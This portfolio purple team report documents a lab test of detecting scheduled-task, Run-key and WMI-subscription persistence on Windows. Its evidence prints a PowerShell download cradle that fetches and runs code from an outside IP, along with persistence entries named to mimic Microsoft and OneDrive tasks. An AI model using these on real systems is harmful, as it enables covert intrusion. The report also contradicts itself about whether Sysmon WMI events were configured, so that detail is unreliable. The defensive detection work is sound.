# Purple Team Exercise Report
## Day 06 — Endpoint Persistence Detection Validation

---

| Field | Details |
|-------|---------|
| **Analyst** | Blaakpearl |
| **Report Date** | 2025-01-16 |
| **Report Type** | Purple Team Exercise — Persistence Detection Validation |
| **Classification** | Portfolio / Training Exercise |
| **Target (Fictional)** | NovaCrest Capital Group — Isolated Lab VM |
| **Track** | Purple Team |
| **ATT&CK Phase** | Persistence (TA0003) |
| **Exercise Duration** | 2 hours |
| **Exercise Status** | Complete — All 3 mechanisms detected |

---

## Executive Summary

A structured purple team exercise was conducted to validate NovaCrest Capital
Group's detection capability against three common Windows endpoint persistence
mechanisms — Scheduled Task, Registry Run Key, and WMI Event Subscription. The
exercise was conducted in an isolated lab environment under controlled conditions,
with red side deployment timed and blue side detection measured to produce
objective mean-time-to-detect (MTTD) metrics.

All three persistence mechanisms were detected within the 2-hour SLA window.
However, the exercise exposed **four significant detection gaps**: WMI event
monitoring (Sysmon Events 19/20/21) was not enabled in the production Sysmon
configuration; Run key alerting only covered HKLM and missed HKCU; scheduled
task detection required a manually enabled audit policy not present in the
baseline config; and OSQuery was not deployed to all endpoints.

Three production-quality Sigma rules were developed during the exercise and are
ready for immediate SIEM deployment. The WMI subscription rule carries a
**Critical** severity rating and should be treated as a Tier 1 alert requiring
immediate escalation.

**Key finding: detection was achieved through active hunting and direct WMI
namespace enumeration — not through automated alerting. In a real incident,
the WMI subscription would have survived a reboot and re-established C2 access
while remaining completely invisible to standard security monitoring.**

This finding directly informs the Day 04 incident: DESKTOP-FIN-047 should be
forensically examined for WMI subscriptions before any reimaging, as the 11-day
dwell time is sufficient for an attacker to establish multiple persistence layers.

---

## Exercise Design

```
Format:         Controlled purple team — same analyst plays red and blue
Environment:    Windows 11 isolated lab VM — no production connectivity
Red objective:  Deploy 3 persistence mechanisms with 20-minute spacing
Blue objective: Detect all 3 within 2-hour total window

Mechanism 1:  Scheduled Task          Deployed: 10:00:00
Mechanism 2:  Registry Run Key        Deployed: 10:20:00
Mechanism 3:  WMI Event Subscription  Deployed: 10:40:00

Tooling Available (Blue):
  ✅ Sysmon (deployed — config gaps identified)
  ✅ OSQuery (deployed)
  ✅ Velociraptor (deployed)
  ✅ Sysinternals Autoruns
  ✅ Windows Event Log (Security + Sysmon channels)
  ❌ RITA (not deployed — gap)
  ❌ EDR behavioral analytics (not in lab scope)
```

---

## Detection Scorecard

| Mechanism | Deployed | Detected | MTTD | Detection Method | Status |
|-----------|----------|----------|------|-----------------|--------|
| Scheduled Task | 10:00:00 | 10:08:22 | **8m 22s** | OSQuery `scheduled_tasks` + Event 4698 | ✅ |
| Registry Run Key | 10:20:00 | 10:23:45 | **3m 45s** | Sysmon Event 13 + Autoruns diff | ✅ |
| WMI Subscription | 10:40:00 | 10:58:11 | **18m 11s** | PowerShell WMI namespace enum + Sysmon 20 | ✅ |
| **Average MTTD** | — | — | **10m 06s** | — | ✅ All within SLA |

**SLA Result: PASSED** — all three mechanisms detected within 2-hour window.
**Detection quality: MIXED** — Mechanisms 1 and 2 triggered automated rules;
Mechanism 3 required manual hunting with no automated alert.

---

## Technical Findings

---

### FINDING-01 — WMI Event Subscription: No Automated Detection

**Severity:** 🔴 Critical
**ATT&CK:** T1546.003 — Event Triggered Execution: WMI Event Subscription

**Description:**
WMI permanent event subscriptions are one of the most stealthy persistence
mechanisms available on Windows. They execute at system boot, survive user
logoffs, are invisible in Task Manager, and do not appear in standard Autoruns
output without the WMI entries enabled. Despite Sysmon being deployed, the
production configuration did not include WMI event rules (Events 19/20/21) —
meaning subscription creation generated **zero automated alerts**.

Detection was achieved only through **manual analyst action**: direct PowerShell
enumeration of the `root\subscription` WMI namespace. In a real incident without
a human actively hunting, this mechanism would have survived indefinitely.

**Evidence:**
```
Mechanism 3 Deployment:
  Time:        2025-01-16 10:40:00 UTC
  Filter:      SCM_EventLog_Filter
  Consumer:    SCM_EventLog_Consumer
  Trigger:     System uptime 200–320 seconds (post-boot window)
  Command:     powershell.exe -WindowStyle Hidden -Command
               IEX(New-Object Net.WebClient).DownloadString(
               'http://185.220.101.33/stage2')
  Binding:     Filter → Consumer (subscription complete)

Sysmon Status at Detection Time:
  Event 19 generated:  YES (WmiEvent filter created)
  Event 20 generated:  YES (WmiEvent consumer created)
  Event 21 generated:  YES (WmiEvent binding created)
  SIEM alert fired:    NO — Sysmon config included WMI rules but
                           no corresponding Sigma rule was deployed
  Manual detection at: 10:58:11 (18m 11s MTTD)

OSQuery Detection:
  Query: SELECT name, command_line_template FROM wmi_cli_event_consumers
  Result: SCM_EventLog_Consumer — powershell.exe download cradle VISIBLE
  Time to detect via OSQuery: 4 minutes once queried manually
```

**Why This Matters for the Day 04 Incident:**
The threat actor who beaconed from DESKTOP-FIN-047 for 11 days had ample
opportunity to deploy WMI persistence. If a WMI subscription exists on
DESKTOP-FIN-047, reimaging the workstation without first removing the
subscription will not achieve full remediation — the beacon will re-establish
on the next reboot of any other system where the subscription was deployed
via lateral movement.

**Recommendation:**
Deploy `sigma_wmi_subscription_persistence.yml` to SIEM immediately — level
Critical. Add WMI namespace enumeration to Velociraptor weekly hunt schedule
across all endpoints. Include the OSQuery `wmi_cli_event_consumers` query in
the daily SOC morning checklist. Update Sysmon configuration to enable WMI
events on all production endpoints.

---

### FINDING-02 — Scheduled Task: Detected but Config Gap Exposed

**Severity:** 🟠 High
**ATT&CK:** T1053.005 — Scheduled Task/Job: Scheduled Task

**Description:**
The scheduled task mechanism (`MicrosoftEdgeUpdateTaskMachineCore`) was detected
in 8 minutes 22 seconds via OSQuery's `scheduled_tasks` table and Windows
Security Event 4698. However, Event 4698 requires the **"Audit Object Access"**
policy to be enabled — and this policy was not present in the default Group Policy
baseline. Detection succeeded in the lab because the policy happened to be enabled
on the test VM, but would fail on production endpoints without the policy deployed.

**Evidence:**
```
Deployment:
  Task Name:    MicrosoftEdgeUpdateTaskMachineCore  ← mimics legitimate task
  Action:       powershell.exe -WindowStyle Hidden -EncodedCommand <B64>
  Trigger:      Every 60 minutes
  Run Level:    Highest (elevated)
  Hidden:       True

Detection via OSQuery (10:08:22):
  Query: SELECT name, action, hidden FROM scheduled_tasks
         WHERE action LIKE '%powershell%' OR action LIKE '%encoded%'
  Result: MicrosoftEdgeUpdateTaskMachineCore flagged — powershell + hidden = true

Event 4698 — A scheduled task was created:
  TaskName:    \MicrosoftEdgeUpdateTaskMachineCore
  SubjectUser: LAB\Analyst
  TaskContent: <Actions><Exec><Command>powershell.exe</Command>...

Gap Identified:
  Audit Object Access policy:   NOT in baseline GPO
  Production endpoints at risk: All without this policy enabled
  Sysmon Event 1 (process):    Fired on execution — provides backup detection
```

**Naming Convention Analysis:**
The task name `MicrosoftEdgeUpdateTaskMachineCore` is designed to blend with
legitimate Microsoft Edge update tasks (`MicrosoftEdgeUpdateTaskMachineCore`
and `MicrosoftEdgeUpdateTaskMachineUA` are real tasks). Without the
`--print-all` Autoruns flag or an OSQuery baseline comparison, a tier-1
analyst reviewing task names visually would likely skip it.

**Recommendation:**
Deploy Group Policy to enable Audit Object Access on all domain-joined
endpoints. Establish an OSQuery scheduled task baseline for all endpoints —
any new task with PowerShell, encoded commands, or hidden flag triggers
immediate review. Deploy `sigma_scheduled_task_persistence.yml` to SIEM.

---

### FINDING-03 — Registry Run Key: Fastest Detection (3m 45s) — HKCU Gap

**Severity:** 🟠 High
**ATT&CK:** T1547.001 — Boot/Logon AutoStart: Registry Run Keys

**Description:**
The Registry Run key mechanism was the fastest to detect (3 minutes 45 seconds)
because Sysmon Event 13 (Registry Value Set) fired immediately on the registry
write and the Autoruns differential analysis clearly highlighted the new entry.
However, a critical gap was identified: the existing Sigma rule for registry
persistence only covered `HKLM` (system-wide), not `HKCU` (current user). An
attacker writing to `HKCU\...\Run` — which does not require administrative
privileges — would have evaded the production Sigma rule.

**Evidence:**
```
Deployment:
  Path:    HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
  Key:     OneDriveStandaloneUpdater   ← mimics legitimate OneDrive updater
  Value:   C:\Users\Public\Libraries\updater.exe
  Privs:   Standard user — NO admin required

Sysmon Event 13 (10:23:45):
  EventID:      13
  TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
                OneDriveStandaloneUpdater
  Details:      C:\Users\Public\Libraries\updater.exe
  Image:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Autoruns Differential:
  NEW ENTRY DETECTED:
  Location: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  Entry:    OneDriveStandaloneUpdater
  Image:    C:\Users\Public\Libraries\updater.exe
  Signed:   NO — binary not signed
  Hash:     [hash value — submit to VirusTotal]

Production Sigma Rule Gap:
  Existing rule:  Covers HKLM\...\Run  ✅
  Missing:        HKCU\...\Run         ❌ — no alert would fire in production
```

**Recommendation:**
Update production Sigma rule to cover all Run key paths including HKCU variants.
The updated `sigma_registry_run_key_persistence.yml` developed in this exercise
covers all five Run key locations. Deploy immediately. Also note: unsigned
binaries in Run keys should trigger at **High** severity regardless of the
specific path — the Autoruns signing check is the critical differentiator
between legitimate and malicious entries.

---

### FINDING-04 — Sysmon Configuration Gap: WMI Events Not in Production Config

**Severity:** 🟠 High
**ATT&CK:** T1562.001 — Impair Defenses: Disable or Modify Tools

**Description:**
The production Sysmon configuration deployed across NovaCrest endpoints did not
include WMI event rules (Events 19, 20, 21). This is a common gap in
community-published Sysmon configurations — WMI events generate high volume on
some systems and are often omitted for noise reduction. The result is a complete
blind spot for one of the most commonly used advanced persistence techniques.

**Evidence:**
```
Production Sysmon Config Analysis:
  Events Enabled:
    1  — Process Create            ✅
    3  — Network Connect           ✅
    7  — Image Load                ✅
    10 — Process Access            ✅
    11 — File Create               ✅
    12 — Registry Object           ✅
    13 — Registry Value Set        ✅
    15 — File Create Stream Hash   ✅
    19 — WMI Event Filter          ❌ NOT IN CONFIG
    20 — WMI Event Consumer        ❌ NOT IN CONFIG
    21 — WMI Filter-Consumer Bind  ❌ NOT IN CONFIG

Impact:
  WMI subscription creation:  INVISIBLE to Sysmon
  C2 command via WMI consumer: INVISIBLE
  WMI-based lateral movement: INVISIBLE

Scope:
  All production Windows endpoints with current Sysmon config
  Estimated affected endpoints: All (config pushed via GPO)
```

**Recommendation:**
Update the centrally managed Sysmon configuration (GPO push) to add WMI event
rules using the configuration XML developed in this exercise. Monitor the volume
impact for 48 hours after deployment — tune filter exclusions if needed for
legitimate WMI-using management tools (SCOM, etc.). This is the highest priority
configuration change from this exercise.

---

## MITRE ATT&CK Technique Matrix

| ID | Technique | Tactic | Finding | Detection |
|----|-----------|--------|---------|-----------|
| **T1053.005** | Scheduled Task | Persistence | FINDING-02 | Event 4698 + OSQuery |
| **T1547.001** | Registry Run Keys | Persistence | FINDING-03 | Sysmon Event 13 |
| **T1546.003** | WMI Event Subscription | Persistence | FINDING-01 | Manual WMI enum |
| **T1059.001** | PowerShell | Execution | All 3 mechanisms | Sysmon Event 1 |
| **T1036.005** | Masquerading | Defense Evasion | FINDING-02 | Baseline comparison |
| **T1112** | Modify Registry | Defense Evasion | FINDING-03 | Sysmon Event 13 |
| **T1562.001** | Impair Defenses | Defense Evasion | FINDING-04 | Config review |

---

## Detection Rules Deployed

| Rule | File | Severity | Gap Fixed |
|------|------|----------|-----------|
| Scheduled Task — Suspicious Payload | `sigma_scheduled_task_persistence.yml` | High | Audit policy dep. |
| Registry Run Key — All Paths | `sigma_registry_run_key_persistence.yml` | Medium | HKCU coverage |
| WMI Subscription — Any Creation | `sigma_wmi_subscription_persistence.yml` | Critical | Full WMI blind spot |

---

## Risk Assessment — DREAD Scoring

| Finding | Damage | Reproducibility | Exploitability | Affected Users | Discoverability | **/50** | **Rating** |
|---------|:------:|:---------------:|:--------------:|:--------------:|:---------------:|:-------:|:----------:|
| FINDING-01 (WMI no alert) | 10 | 9 | 8 | 10 | 3 | **40** | 🔴 Critical |
| FINDING-02 (Task audit gap) | 7 | 8 | 7 | 10 | 5 | **37** | 🔴 Critical |
| FINDING-03 (HKCU blind spot) | 7 | 9 | 9 | 10 | 4 | **39** | 🔴 Critical |
| FINDING-04 (Sysmon WMI gap) | 9 | 8 | 8 | 10 | 3 | **38** | 🔴 Critical |

### Overall Exercise Risk Rating: 🔴 CRITICAL (detection gaps)

---

## Remediation Priority Matrix

| Priority | Action | Owner | Deadline |
|----------|--------|-------|----------|
| **P0 — Immediate** | Deploy `sigma_wmi_subscription_persistence.yml` to SIEM | Detection Eng | Today |
| **P0 — Immediate** | Update Sysmon GPO config — enable Events 19/20/21 | IT Security | Today |
| **P0 — Immediate** | Hunt WMI subscriptions on DESKTOP-FIN-047 forensic image | IR Team | Today |
| **P1 — 24 Hours** | Hunt WMI subscriptions across all endpoints via OSQuery | Threat Hunt | 24 hrs |
| **P1 — 24 Hours** | Deploy updated registry Sigma rule (HKCU + HKLM coverage) | Detection Eng | 24 hrs |
| **P1 — 24 Hours** | Enable Audit Object Access GPO on all domain endpoints | IT / AD Admin | 24 hrs |
| **P2 — 1 Week** | Add WMI namespace enumeration to Velociraptor weekly hunt | Threat Hunt | 1 week |
| **P2 — 1 Week** | Establish OSQuery scheduled_tasks baseline for all endpoints | Detection Eng | 1 week |
| **P3 — 30 Days** | Repeat this purple team exercise after all fixes deployed | Purple Team | 30 days |

---

## Analyst Notes — The WMI Problem

The WMI persistence mechanism deserves additional commentary because it
illustrates a fundamental tension in defensive security: **the most powerful
detection tool in your stack is useless if it is not configured to watch
the right thing.**

Sysmon was deployed. Events 19, 20, and 21 were being generated. But because
no Sigma rule had been written for them and no SIEM alert was configured, those
events were being written to a log file that no one was reading. The WMI
subscription sat in the `root\subscription` namespace, generating three Sysmon
events at creation time and then going completely silent — invisible to every
automated monitoring system in the environment.

The lesson is not "deploy more tools." The lesson is:
**for every detection tool deployed, there must be a corresponding tested
detection rule, a responsible analyst who reviews it, and a regular exercise
like this one that proves it actually works.**

Detection capability is not the presence of Sysmon. It is the proven,
measured, time-stamped demonstration that your Sysmon configuration catches
the specific techniques your threat actors use — and that your Sigma rules
translate those events into actionable alerts before an attacker achieves
their objective.

This exercise ran in a lab. The next one ran in production by a real attacker.
The 10-minute MTTD measured here became the target. Every gap identified today
is a gap that would have extended the Day 04 attacker's 11-day dwell time.

---

## Kill Chain Connection — Days 01 Through 06

```
Day 01: External recon maps VPN portal and email security gaps
Day 02: 312 credentials in breach data — trading desk analyst included
Day 03: Phishing infrastructure built — HR lure, M365 harvester
Day 04: C2 beacon runs 11 days on DESKTOP-FIN-047 — DNS tunnel exfil
Day 05: OSINT shows attacker knew exactly who to target and how
Day 06: Purple team confirms what persistence looks like — and that
        WMI subscriptions on FIN-047 would survive a simple reimage

→ Day 07: Full kill chain synthesis — ATT&CK Navigator layer export
```

---

## References

- [MITRE ATT&CK T1546.003 — WMI Event Subscription](https://attack.mitre.org/techniques/T1546/003/)
- [MITRE ATT&CK T1053.005 — Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
- [MITRE ATT&CK T1547.001 — Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)
- [Velociraptor — Windows.Registry.RunKeys](https://docs.velociraptor.app/artifact_references/pages/windows.registry.runkeys/)
- [OSQuery Schema — wmi_event_filters](https://osquery.io/schema/current/#wmi_event_filters)
- [Sysmon WMI Events 19/20/21](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)

---

*Previous: [Day 05 ←](../day-05/REPORT.md) | Next: [Day 07 →](../day-07/SCENARIO.md)*

---
*Report generated as part of the [Blaakpearl 30-Day Security Portfolio](../../README.md)*
